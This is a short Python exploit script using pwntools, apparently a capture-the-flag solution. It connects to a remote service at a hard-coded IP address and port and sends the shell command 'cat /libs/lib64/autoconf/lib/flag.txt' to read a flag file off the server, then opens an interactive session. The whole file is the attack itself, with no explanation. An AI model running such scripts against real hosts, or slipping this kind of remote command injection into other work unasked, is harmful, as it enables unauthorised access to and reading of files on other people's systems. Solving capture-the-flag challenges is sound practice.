#!/usr/bin/python3

from pwn import *

p = remote('34.150.138.102', 5001)
payload = "cat /libs/lib64/autoconf/lib/flag.txt"

p.sendline(payload)
p.interactive()